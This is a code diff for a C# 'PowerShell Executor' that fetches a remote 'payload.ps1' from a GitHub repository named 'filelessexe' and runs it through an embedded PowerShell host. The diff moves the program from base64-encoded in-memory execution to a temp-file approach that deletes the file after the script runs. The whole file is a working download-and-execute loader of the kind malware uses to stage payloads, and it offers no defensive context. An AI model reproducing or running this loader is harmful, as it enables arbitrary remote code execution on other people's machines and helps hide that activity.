@@ -1,27 +1,26 @@
 using System;
+using System.IO;
 using System.Net.Http;
 using System.Management.Automation;
-using System.Text;
 using System.Threading.Tasks;
 
 class Program
 {
     static async Task Main()
     {
-        Console.Title = "PowerShell Executor"; // Set Console Window Title
+        Console.Title = "PowerShell Executor";
         Console.WriteLine("[INFO] Starting PowerShell script execution...");
 
         string payloadUrl = "https://raw.githubusercontent.com/N4V33NM/filelessexe/refs/heads/main/payload.ps1";
         Console.WriteLine($"[INFO] Using payload URL: {payloadUrl}");
 
-        string payloadContent = await FetchPayload(payloadUrl);
+        string tempFilePath = Path.Combine(Path.GetTempPath(), "temp_payload.ps1");
+        
+        string payloadContent = await FetchPayload(payloadUrl, tempFilePath);
 
         if (!string.IsNullOrEmpty(payloadContent))
         {
-            Console.WriteLine("[INFO] Encoding fetched payload...");
-            string encodedPayload = Convert.ToBase64String(Encoding.UTF8.GetBytes(payloadContent));
-
-            ExecutePayload(encodedPayload);
+            ExecutePayload(tempFilePath);
         }
         else
         {
@@ -32,45 +31,39 @@ class Program
         Console.ReadLine();
     }
 
-    static async Task<string> FetchPayload(string url)
+    static async Task<string> FetchPayload(string url, string tempFilePath)
     {
         try
         {
             Console.WriteLine($"[INFO] Fetching payload from: {url}");
             using (HttpClient client = new HttpClient())
             {
-                client.Timeout = TimeSpan.FromSeconds(10); // Set a timeout to avoid hanging
+                client.Timeout = TimeSpan.FromSeconds(10);
                 string content = await client.GetStringAsync(url);
-                Console.WriteLine("[SUCCESS] Payload fetched successfully!");
+                
+                // Write to a temp file
+                await File.WriteAllTextAsync(tempFilePath, content);
+                Console.WriteLine($"[SUCCESS] Payload written to: {tempFilePath}");
+                
                 return content;
             }
         }
-        catch (HttpRequestException httpEx)
-        {
-            Console.WriteLine($"[ERROR] HTTP Request failed: {httpEx.Message}");
-        }
-        catch (TaskCanceledException)
-        {
-            Console.WriteLine("[ERROR] Fetching payload timed out.");
-        }
         catch (Exception ex)
         {
-            Console.WriteLine($"[ERROR] Unexpected error: {ex.Message}");
+            Console.WriteLine($"[ERROR] Failed to fetch payload: {ex.Message}");
+            return string.Empty;
         }
-        return string.Empty;
     }
 
-    static void ExecutePayload(string base64Payload)
+    static void ExecutePayload(string filePath)
     {
         try
         {
-            Console.WriteLine("[INFO] Decoding payload...");
-            string decodedPayload = Encoding.UTF8.GetString(Convert.FromBase64String(base64Payload));
-
             Console.WriteLine("[INFO] Executing payload in-memory...");
             using (PowerShell ps = PowerShell.Create())
             {
-                ps.AddScript(decodedPayload);
+                string scriptContent = File.ReadAllText(filePath);
+                ps.AddScript(scriptContent);
                 var results = ps.Invoke();
 
                 Console.WriteLine("[INFO] Execution Results:");
@@ -88,21 +81,20 @@ class Program
                     }
                 }
             }
+
             Console.WriteLine("[SUCCESS] Payload executed!");
-        }
-        catch (FormatException)
-        {
-            Console.WriteLine("[ERROR] Failed to decode Base64 payload.");
+
+            // Delete the temporary file after execution
+            File.Delete(filePath);
+            Console.WriteLine("[INFO] Temp file deleted.");
         }
         catch (Exception ex)
         {
             Console.WriteLine($"[ERROR] Failed to execute payload: {ex.Message}");
         }
-
-        Console.WriteLine("[INFO] Press Enter to continue...");
-        Console.ReadLine();
     }
 }
+
 
 
 
